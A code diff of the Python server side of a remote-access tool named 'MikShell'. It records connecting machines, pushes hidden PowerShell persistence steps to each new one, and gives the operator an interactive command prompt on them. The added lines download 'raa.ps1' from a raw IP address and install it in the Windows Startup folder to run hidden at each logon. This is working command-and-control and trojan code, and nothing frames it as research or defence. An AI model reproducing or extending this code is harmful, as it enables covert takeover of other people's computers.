@@ -38,33 +38,28 @@ def client_handler(connection):
     # Check if data.decode("utf-8")+" "+connection.getpeername()[0] in database if not add it
     cur.execute("SELECT info FROM users;")
     values = cur.fetchall()
+    user = whoami+" "+connection.getpeername()[0]
     already_exists = not all(
-        [x[0] != whoami+" "+connection.getpeername()[0] for x in values])
+        [x[0] != user for x in values])
     if not already_exists:
         con.execute("INSERT INTO users VALUES (?);",
-                    (whoami+" "+connection.getpeername()[0], ))
+                    (user, ))
         con.commit()
-        connection.send("(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell".encode("utf-8"))
-        shelltype = connection.recv(2048*8
-         ).decode("utf-8")
-        shelltype = json.loads(shelltype)["out"].replace("\n", "").replace("\r", "")
-        startup_steps = []
-        if shelltype == "CMD":
-            startup_steps = []
-        elif shelltype == "PowerShell":
-            startup_steps = [
-                "mkdir C:/IFound; Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
-                "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
-                "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
-            ]
+        startup_steps = [
+            "mkdir C:/IFound; Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
+            "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
+        ]
         for step in startup_steps:
-            connection.send(step.encode("utf-8"))
-            connection.recv(2048*8).decode("utf-8")
-    onlines[whoami+" "+connection.getpeername()[0]
+            try:
+                connection.send(step.encode("utf-8"))
+                connection.recv(2048*8).decode("utf-8")
+            except ConnectionResetError:
+                break
+    onlines[user
             ] = {'connection': connection, 'address': connection.getpeername(), 'path': json.loads(data)["path"].replace("\n", "").replace("\r", "")}
-    while onlines.get(whoami+" "+connection.getpeername()[0]) != None:
+    while onlines.get(user) != None:
         time.sleep(1)
-    print("Closed")
     connection.close()
 
 
@@ -106,8 +101,8 @@ def shell():
     shell_command = input(
         f"MikShell|{user.split(' ')[0]}|{user.split(' ')[1]}|\n{onlines[user]['path']}>")
     while shell_command != "mikshell-exit":
-        onlines[user]['connection'].send(shell_command.encode("utf-8"))
         try:
+            onlines[user]['connection'].send(shell_command.encode("utf-8"))
             data = onlines[user]['connection'].recv(2048*8).decode("utf-8")
         except ConnectionResetError:
             print("Connection lost")
